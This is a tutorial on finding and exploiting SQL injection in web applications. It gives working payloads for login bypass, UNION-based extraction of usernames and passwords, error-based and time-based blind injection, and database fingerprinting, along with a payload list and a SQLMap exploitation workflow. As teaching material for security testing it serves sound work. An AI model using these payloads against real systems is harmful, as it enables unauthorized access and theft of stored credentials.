
SQL Injection (SQLi) is one of the most critical and common vulnerabilities in web applications. Testing for SQLi involves **injecting malicious SQL payloads** into application inputs to see if the input is executed as part of an SQL query.

The following guide covers everything from **basic tests** to **advanced exploitation techniques**, with detailed examples.

---

## 1. What to Inject (Payload Categories)

When testing, you should try inputs that are known to break or manipulate SQL queries. Common categories include:

* **String terminators**:

  * `'` (single quote)
  * `"` (double quote)

* **SQL commands**:

  * `SELECT`, `UNION`, `INSERT`, `UPDATE`, `DELETE`, `DROP`

* **SQL comments**:

  * `--` (double dash)
  * `#` (hash)
  * `/* ... */` (multi-line comment)

These inputs help determine whether your value is being executed as part of an SQL query.

➢ **Example:**
Search field:

```
test'
```

Error message:

```
You have an error in your SQL syntax...
```

→ This indicates SQLi.

---

## 2. One Payload at a Time

Always test one payload at a time. If you send multiple payloads together and the app reacts differently, you won’t know **which payload** caused the effect.

---

## 3. Integer-Based SQL Injection

Sometimes parameters are treated as integers.

### Example Query:

```sql
SELECT * FROM users WHERE id = FUZZ;
```

### Testing integer-based injection:

URL:

```
http://site.com/user.php?id=1
```

Payloads:

* `AND 1=1` → Always True
* `AND 1=2` → Always False
* `1-1` → Returns 0 if executed
* `1*56` → Returns 56 if executed

➢ **Observation:**
If the page output changes depending on these payloads, it indicates SQL Injection.

---

## 4. String-Based SQL Injection

Other parameters are processed as **strings**.

### Example Query:

```sql
SELECT * FROM users WHERE name = 'FUZZ';
```

### Testing string-based injection:

URL:

```
http://site.com/user.php?name=alexis
```

Payloads:

* `'` → Error (False)
* `''` → Empty string (True)
* `" OR ""="` → True condition
* `' OR '1'='1` → Bypasses filter

---

## 5. Exploiting the Single Quote (`'`)

The `'` character is the most common injection entry point.

### Example: Login Form

Vulnerable query:

```sql
SELECT * FROM users WHERE username = '<username>' AND password = '<password>';
```

### Attacker input:

```
' OR '1'='1' --
```

Resulting query:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = '<password>';
```

* `'` closes the original string
* `OR '1'='1'` makes the condition always true
* `--` comments out the password check

➢ Outcome: Attacker logs in without knowing the password.

---

## 6. Error-Based SQL Injection

Some apps return detailed **database error messages**. These can be exploited.

* **MS-SQL error**:

  ```
  Incorrect syntax near '...'
  ```
* **MySQL error**:

  ```
  You have an error in your SQL syntax...
  ```

➢ **Example:**
Injecting:

```
' AND 1=CONVERT(int,(SELECT @@version))--
```

may reveal the database version in the error message.

---

## 7. Union-Based SQL Injection

The `UNION SELECT` operator allows attackers to combine results from multiple queries.

➢ **Example:**

URL:

```
http://site.com/products.php?id=1
```

Payload:

```
1 UNION SELECT username, password FROM users--
```

If vulnerable, the application might display user credentials alongside normal product data.

💡 Tip: Union attacks require **matching the number of columns**. Attackers test this by using `NULL` values:

```
1 UNION SELECT NULL--
1 UNION SELECT NULL, NULL--
1 UNION SELECT NULL, NULL, NULL--
```

---

## 8. Boolean-Based Blind SQLi

When no error messages are shown, attackers rely on **True/False conditions** to infer data.

➢ **Example:**

```
?id=1' AND '1'='1
```

Page loads normally → True condition.

```
?id=1' AND '1'='2
```

Page loads differently → False condition.

By repeating this logic, attackers can extract data character by character.

---

## 9. Time-Based Blind SQLi

If the app doesn’t display errors or output differences, attackers can use **time delays**.

➢ **Example (MySQL):**

```
?id=1' OR IF(1=1, SLEEP(5), 0)--
```

If the response delays 5 seconds, SQL Injection is confirmed.

---

## 10. Second-Order SQL Injection

This occurs when malicious input is **stored in the database** and later executed in another query.

➢ **Example:**

* Attacker registers with username:

  ```
  admin' --
  ```
* Later, when an admin reviews user accounts, the stored payload modifies a query.

---

## 11. Database Fingerprinting

Identifying the backend DBMS is important because payloads differ.

* **MySQL**:

  ```
  SELECT @@version;
  ```
* **MSSQL**:

  ```
  SELECT @@version;
  ```
* **Oracle**:

  ```
  SELECT * FROM v$version;
  ```
* **PostgreSQL**:

  ```
  SELECT version();
  ```

---

## 12. Common SQLi Payloads

Some widely used test payloads:

```
'
''
"
""
--
#
/*
' OR '1'='1
" OR "1"="1
' OR 'x'='x
' AND id IS NULL; --
admin' --
admin' #
' OR 2>1 --
```

---

## 13. Database-Specific Payloads

* **MySQL / MSSQL / Oracle / PostgreSQL / SQLite:**

  ```
  ' OR '1'='1' --
  ' OR '1'='1' /*
  ```

* **MySQL with hash comment:**

  ```
  ' OR '1'='1' #
  ```

* **MS Access (with null chars):**

  ```
  ' OR '1'='1' %00
  ' OR '1'='1' %16
  ```

---

## 14. Automated Testing

Manual testing is powerful, but automation speeds things up.

* **SQLMap** → Fully automated SQLi exploitation.
* **Burp Suite** → Manual + automated scanning.
* **OWASP ZAP** → Open-source scanner.

➢ **Example workflow:**

1. Find suspicious parameter manually.
2. Confirm with Boolean/Time payloads.
3. Run SQLMap for automated exploitation and database extraction.

---

 **Summary**

* Identify if parameter is **string or integer-based**.
* Test with simple payloads (`'`, `"`, `--`).
* Use different techniques:

  * Error-based (get DB errors)
  * Union-based (retrieve data)
  * Boolean-based (true/false responses)
  * Time-based (delays confirm blind SQLi)
  * Second-order (stored payloads)
* Fingerprint DB type for DB-specific payloads.
* Use automation tools like **SQLMap** to confirm and exploit.

---
### **1. Cheat Sheets**

* [PayloadBox SQLi Payload List](https://github.com/payloadbox/sql-injection-payload-list) → A large collection of ready-to-use SQLi payloads.
* [PortSwigger SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) → Well-structured reference of SQLi payloads and techniques.

### **2. OWASP**

* [OWASP Web Security Testing Guide (WSTG)](https://owasp.org/www-project-web-security-testing-guide/) → Official guide with detailed methodologies for identifying and exploiting SQLi.

